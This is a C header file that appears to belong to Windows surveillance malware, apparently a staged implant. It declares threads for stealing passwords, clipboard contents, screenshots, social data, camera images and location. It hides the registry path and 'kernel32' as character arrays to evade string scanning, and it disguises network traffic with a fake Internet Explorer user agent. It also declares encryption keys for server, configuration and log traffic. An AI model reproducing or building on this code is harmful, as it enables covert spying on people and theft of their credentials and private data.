#ifndef _GLOBALS_H
#define _GLOBALS_H

#include <Windows.h>

extern BOOL bCollectEvidences;

#ifdef _DEBUG
	#define WAIT_INPUT			1
#else
	#define WAIT_INPUT			30
#endif // _DEBUG

#ifndef SHA_DIGEST_LENGTH
#define SHA_DIGEST_LENGTH 20
#endif 

#define CONNECT_TIMEOUT 10000
#define RESOLVE_TIMEOUT 10000
#define SEND_TIMEOUT 600000
#define RECV_TIMEOUT 600000

#define SOLDIER_REGISTRY_KEY { L'S', L'o', L'f', L't', L'w', L'a', L'r', L'e', L'\\', L'M', L'i', L'c', L'r', L'o', L's', L'o', L'f', L't', L'\0' };
#define SOLDIER_REGISTRY_TSTAMPS { L't', L'\0' };
#define SOLDIER_REGISTRY_CONF { L'c', L'\0' };
#define SHARED_MEMORY_WRITE_SIZE 4096

#define MAX_DEBUG_STRING 4096
#define MAX_REGISTRY_NAME 255
#define MAX_FILE_PATH 32767

#define STAGE_SCOUT 0
#define STAGE_SERGENT  1
#define STAGE_ELITE 2

#define ELEM_DELIMITER 0xABADC0DE
#define USER_AGENT L"Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)"
//#define USER_AGENT L"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2.25) Gecko/20111212 Firefox/3.6.25 ( .NET CLR 3.5.30729)"
#define KERNEL32 { L'k', L'e', L'r', L'n', L'e', L'l', L'3', L'2', L'\0' };

extern BYTE pServerKey[32];
extern BYTE pConfKey[32];
extern BYTE pSessionKey[20];
extern BYTE pLogKey[32];

extern HANDLE hScoutSharedMemory;
extern HWND hScoutMessageWindow;
extern HANDLE hMsgTimer;

extern BOOL bPositionThread;
extern BOOL bClipBoardThread;
extern BOOL bPasswordThread;
extern BOOL bScreenShotThread;
extern BOOL bSocialThread;
extern BOOL bCameraThread;

extern HANDLE hPositionThread;
extern HANDLE hClipBoardThread;
extern HANDLE hPasswordThread;
extern HANDLE hScreenShotThread;
extern HANDLE hSocialThread;
extern HANDLE hCameraThread;

#endif // _GLOBALS_H